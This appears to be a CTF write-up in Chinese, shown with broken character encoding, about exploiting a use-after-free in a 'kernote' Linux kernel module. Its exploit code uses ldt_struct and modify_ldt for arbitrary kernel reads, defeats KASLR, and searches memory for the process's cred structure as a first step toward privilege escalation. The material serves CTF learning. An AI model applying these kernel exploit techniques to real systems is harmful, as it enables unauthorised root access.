<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SET_NOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_ENTRY 0x6667</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_ENTRY 0x6668</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_NOTE 0x6669</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> kfd;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">set_note</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, SET_NOTE, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_entry</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, ALLOC_ENTRY, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">free_entry</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, FREE_ENTRY, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_note</span><span class="params">(<span class="type">uint64_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, WRITE_NOTE, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    kfd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    alloc_entry(<span class="number">1</span>);</span><br><span class="line">    set_note(<span class="number">1</span>);</span><br><span class="line">    free_entry(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    write_note(<span class="number">0x4141414141414141</span>);</span><br><span class="line">    show_note();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>] = &#123;&#125;;</span><br><span class="line">    read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ©ç”¨æ„å»º</strong></p>
<p>ä¹‹å‰æä¾›çš„ä¿¡æ¯æœ‰ï¼š</p>
<ul>
<li>KASLRï¼ŒSMEPï¼ŒSMAPï¼ŒKPTI</li>
<li>SLAB allocator</li>
<li>é€šè¿‡ç¡¬ç¼–ç å…³é—­ Usermode Helper</li>
<li>å¦‚æœè§¦å‘ kernel warnings æˆ– panic è™šæ‹Ÿæœºä¼šç›´æ¥å…³é—­</li>
</ul>
<p>æœ€ç»ˆçš„ç›®çš„æ˜¯æ§åˆ¶ cred struct ä¿®æ”¹æƒé™ï¼Œæˆ–è€…è°ƒç”¨ commit_creds(preparekernel_cred(0))</p>
<ul>
<li>KASLR ï¼šå†…æ ¸åŠ è½½åœ°å€ä¸å®šï¼Œéœ€è¦é€šè¿‡ object æ³„éœ²å†…æ ¸åŸºå€</li>
</ul>
<p>è¿™é‡Œé€‰æ‹©çš„æ˜¯ <code>ldt_struct</code>ï¼Œå¤§å°ä¸º 0x10ï¼Œåœ¨ kmalloc-32 å†…ï¼Œ<br>ç®€å•äº†è§£ä¸€ä¸‹ï¼Œldt ç±»ä¼¼äº gdtï¼Œä¸»è¦ç”¨äºä¿å­˜è®¿é—®å†…å­˜çš„æ®µæè¿°ç¬¦</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_entries;</span><br><span class="line">	<span class="type">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>ldt_struct</code> çš„å‰å…«ä¸ªå­—èŠ‚æ˜¯ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„æŒ‡é’ˆ<br>è€Œå¦‚ä½•å¯¹ <code>ldt_struct</code> è¿›è¡Œæ“ä½œï¼Œåˆ™å¯ä»¥é€šè¿‡ <code>SYS_modify_ldt</code> ç³»ç»Ÿè°ƒç”¨æ¥å®ç°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼å¯¹ ldt è¿›è¡Œè¯»å†™æ“ä½œ</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">0</span>, buf, len);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, buf, len);</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ <code>read_ldt</code> èƒ½å¹²äº›ä»€ä¹ˆï¼Œå¯ä»¥çœ‹åˆ°å¯¹ size è¿›è¡Œç®€å•çš„å¤§å°åˆ¤æ–­åç›´æ¥å°†è¿›ç¨‹çš„ ldt-&gt;entries æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´åœ°å€</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line">    ...</span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size))</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ <code>write_ldt</code> èƒ½å¹²äº›ä»€ä¹ˆï¼Œç®€å•æ¥è¯´å°±æ˜¯å°† ç”¨æˆ·ç©ºé—´æ„é€ çš„ <code>user_desc</code> è½¬æ¢åå¯¹åŸè¿›ç¨‹çš„ <code>ldt_struct</code> è¿›è¡Œæ›¿æ¢ï¼ŒæœŸé—´ä¼šè°ƒç”¨ <code>alloc_ldt_struct</code> åˆ›å»º <code>ldt_struct</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">		<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br></pre></td></tr></table></figure>
<p>å› æ­¤å¯ä»¥é‡‡ç”¨å¦‚ä¸‹æ–¹å¼å½¢æˆä»»æ„è¯»ï¼š</p>
<ol>
<li>åˆ†é…å¹¶é‡Šæ”¾ç¬”è®°åï¼Œä½¿ç”¨ <code>write_ldt</code> å¯¹ç¬”è®°å†…å­˜è¿›è¡Œå ç”¨</li>
<li>ä½¿ç”¨ UAF å¯¹ ldt entry æŒ‡é’ˆè¿›è¡Œè¦†ç›–</li>
<li>ä½¿ç”¨ <code>read_ldt</code> å¯¹ ldt åœ°å€è¿›è¡Œè¯»å–æ“ä½œ</li>
</ol>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šcopy_to_user åœ¨è®¿é—®é”™è¯¯åœ°å€æ—¶ä¸ä¼šè§¦å‘ kernel panic</p>
<p>å†…æ ¸çš„ä¸€èˆ¬åŠ è½½åœ°å€ä¸ºï¼š0xffffffff81000000</p>
<p>æ‰€ä»¥å¯ä»¥å°è¯•é€šè¿‡ä» 0xffffffff80000000 å¤„å¼€å§‹æœç´¢ï¼Œæ­¥é•¿ä¸º 200000</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> retVal = <span class="number">0</span>;</span><br><span class="line">alloc_entry(<span class="number">1</span>);</span><br><span class="line">set_note(<span class="number">1</span>);</span><br><span class="line">free_entry(<span class="number">1</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="type">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    write_note(addr);</span><br><span class="line">    retVal = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (retVal &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr += <span class="number">0x200000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure>

<p>åœ¨ user_desc æ„é€ æ–¹å¼ä¸Šï¼Œæºç å¦‚ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯</p>
<ol>
<li>entry_number &lt; LDT_ENTRIES</li>
<li>contents !&#x3D; 3<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
æ­¤æ—¶ä¼šæŠ¥é”™ï¼Œè§¦å‘panic<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[    3.957895] usercopy: Kernel memory exposure attempt detected from null address (offset 0, size 8)!</span><br><span class="line">[    3.967668] kernel BUG at mm/usercopy.c:99!</span><br><span class="line">[    3.970064] invalid opcode: 0000 [#1] SMP PTI</span><br><span class="line">[    3.970507] CPU: 1 PID: 144 Comm: poc Tainted: G           OE     5.11.9 #2</span><br><span class="line">[    3.970811] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014</span><br><span class="line">[    3.971277] RIP: 0010:usercopy_abort+0x7b/0x7d</span><br><span class="line">[    3.972089] Code: 4c 0f 45 de 51 4c 89 d1 48 c7 c2 dd 8a dc 84 57 48 c7 c6 43 35 db 84 48 c7 c7 a8 8b dc 84 48 0f 45 f2 4c 89 da e8 02 83 ff ff &lt;0f&gt; 0b 4c 89 e1 49 89 d8 44 89 ea 31 f6 48 29 c1 48 c7 c7 1f 8b dc</span><br><span class="line">[    3.972842] RSP: 0018:ffffa1ad401cbe90 EFLAGS: 00000246</span><br><span class="line">[    3.973328] RAX: 0000000000000057 RBX: 0000000000000008 RCX: c0000000ffffdfff</span><br><span class="line">[    3.973538] RDX: 0000000000000000 RSI: 00000000ffffdfff RDI: 0000000000000246</span><br><span class="line">[    3.973880] RBP: ffffa1ad401cbea8 R08: 0000000000000000 R09: ffffa1ad401cbc68</span><br><span class="line">[    3.974093] R10: 0000000000000001 R11: 0000000000000001 R12: 0000000000000000</span><br><span class="line">[    3.974354] R13: 0000000000000001 R14: 0000000000000008 R15: 0000000000000008</span><br><span class="line">[    3.974590] FS:  000000000169d880(0000) GS:ffff911a87a80000(0000) knlGS:0000000000000000</span><br><span class="line">[    3.974972] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[    3.975190] CR2: ffffffffc0000000 CR3: 000000000293c000 CR4: 00000000003006e0</span><br><span class="line">[    3.975561] Call Trace:</span><br><span class="line">[    3.976301]  __check_object_size.cold+0x5d/0x7b</span><br><span class="line">[    3.976651]  read_ldt+0x89/0xf0</span><br><span class="line">[    3.976752]  __x64_sys_modify_ldt+0x5c/0x90</span><br><span class="line">[    3.976862]  do_syscall_64+0x38/0x90</span><br><span class="line">[    3.977055]  entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br></pre></td></tr></table></figure>
å¯¹ <code>__check_object_size</code> è¿›è¡Œåˆ†æï¼Œæºç å¦‚ä¸‹:<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">    check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">    check_stack_object(ptr, n);</span><br><span class="line">    check_heap_object(ptr, n, to_user);</span><br><span class="line">    check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
æ— æ³•ç›´æ¥è·å– kernel text åŸºå€ï¼Œåˆ™è€ƒè™‘ä»ç‰©ç†å†…å­˜çš„ç›´æ¥æ˜ å°„åœ°å€è¿›è¡Œæœç´¢å¯»æ‰¾é¡µåç§»åŸºå€<blockquote>
<p>Start addr    |   Offset   |     End addr     |  Size   | VM area description<br>ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</p>
</blockquote>
</li>
</ol>
<p>ç”±äºç‰©ç†å†…å­˜ç›´æ¥æ˜ å°„åŒºå¾ˆå¤§ï¼Œæ‰€ä»¥å¯ä»¥æé«˜æ­¥é•¿ï¼Œæˆ‘ä»¬é€‰æ‹© 4000000</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[+] Found page_offset_base: ffff9f1080000000</span><br></pre></td></tr></table></figure>

<ul>
<li>æ§åˆ¶ cred ç»“æ„ä½“</li>
</ul>
<p>è™½ç„¶è·å¾—äº†é¡µåœ°å€ï¼Œä½†æ˜¯åœ¨ä¹‹åæœç´¢ <code>task_struct</code> çš„è¿‡ç¨‹ä¸­ä»å¯èƒ½ä¼šé™·å…¥åˆ° check_object_size æŠ¥é”™</p>
<p>è€Œåœ¨ fork è°ƒç”¨é“¾ä¸­ï¼Œä¼šè°ƒç”¨ <code>ldt_dup_context</code>ï¼Œæºç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">	<span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	â€¦â€¦</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">	       new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">  </span><br><span class="line">	â€¦â€¦</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°çˆ¶è¿›ç¨‹ä¼šæŠŠè°ƒç”¨ memcpy å‡½æ•°å°† ldt-&gt;entries å¤åˆ¶ç»™å­è¿›ç¨‹ï¼Œè¿™å°†ä¸ä¼šè§¦å‘ kernel panicï¼Œå› æ­¤å¦‚æœè¦è·å– task_struct ç»“æ„ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>ä½¿ç”¨ UAF ä¿®æ”¹çˆ¶è¿›ç¨‹ä¸­çš„ ldt-&gt;entries, å¹¶å°†å…¶æŒ‡å‘è¦æœç´¢çš„åœ°å€ï¼Œå³ é¡µåç§»</li>
<li>fork å­è¿›ç¨‹å°† ldt-&gt;entries è¿›è¡Œå¤åˆ¶</li>
<li>åœ¨å­è¿›ç¨‹å†…å¯¹ ldt-&gt;entries è¿›è¡Œæœç´¢ï¼Œå¹¶è¿”å›ç»“æœ</li>
</ol>
<p>æ¯ä¸€ä¸ªè¿›ç¨‹å¯¹åº”å†…æ ¸ä¸­çš„ä¸€ä¸ª task_struct ç»“æ„ï¼Œé‡è¦æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span>				pid;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * executable name, excluding path.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">    * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">    * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„ comm æ˜¯æŒ‡å¯æ‰§è¡Œæ–‡ä»¶çš„åç§°ï¼Œæˆ‘ä»¬è¿›è¡Œç®€å•æµ‹è¯•<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205121542628.png"></p>
<p>å¦‚æœèƒ½é€šè¿‡æœç´¢è¿›ç¨‹çš„ comm å­—æ®µï¼Œæˆ‘ä»¬ä¹Ÿèƒ½é€šè¿‡åç§»è·å– cred ç»“æ„ä»¥åŠè¿›ç¨‹çš„ pid</p>
<p>é€šè¿‡ <code>prntl()</code> å‡½æ•°èƒ½å¤Ÿä½¿å¾—è¿›ç¨‹å¯¹è‡ªå·±çš„ comm åç§°è¿›è¡Œä¿®æ”¹</p>
<p>å› æ­¤è·å–è¿›ç¨‹ pid å’Œ cred ç»“æ„ä½“çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;emiyada&quot;</span>);</span><br><span class="line"><span class="type">int</span> pid = getpid();</span><br><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">pipe(pipefd);</span><br><span class="line"><span class="type">char</span> *buf = (<span class="type">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> PAGE_OFFSET=addr;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    addr+=<span class="number">8000</span>;</span><br><span class="line">    write_note(addr);</span><br><span class="line">    <span class="type">int</span> ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">        ret = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> *search = (<span class="type">unsigned</span> <span class="type">long</span> *) buf;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span> ) search &lt; (<span class="type">unsigned</span> <span class="type">long</span>) buf+<span class="number">0x8000</span>)&#123;</span><br><span class="line">            search = memmem(search, (<span class="type">unsigned</span> <span class="type">long</span>)buf+<span class="number">0x8000</span>- (<span class="type">unsigned</span> <span class="type">long</span>) search, <span class="string">&quot;emiyada&quot;</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span> (search == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ((search[<span class="number">-2</span>] &gt; PAGE_OFFSET) &amp;&amp; (search[<span class="number">-3</span>] &gt; PAGE_OFFSET) &amp;&amp; (<span class="type">int</span>) search[<span class="number">-58</span>]==pid)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Found cred : %llx\n&quot;</span>, search[<span class="number">-2</span>]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Found pid : %d\n&quot;</span>, search[<span class="number">-58</span>]);</span><br><span class="line">                ans = search[<span class="number">-2</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            search+=<span class="number">12</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipefd[<span class="number">1</span>], &amp;ans, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipefd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[+] Found page_offset_base: ffff9106c0000000</span><br><span class="line">Found cred : ffff9106c192f6c0</span><br><span class="line">Found pid : 143</span><br></pre></td></tr></table></figure>

<ul>
<li>ç‰¹æƒæå‡ 1</li>
</ul>
<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»»æ„å†™è¿›è¡Œç‰¹æƒæå‡æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ä»æ—§ä½¿ç”¨ <code>ldt_struct</code>ï¼Œä»ä¹‹å‰ <code>write_ldt</code> å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿›è¡Œè¦†ç›– <code>old_ldt</code> æ“ä½œæ—¶ä¼šè¿›è¡Œ <code>memcpy</code> å¤„ç†ï¼Œå¦‚æœç»“æ„ä½“è¶³å¤Ÿå¤§ï¼Œåˆ™å¯ä»¥å»¶é•¿ copy çš„æ—¶é—´</p>
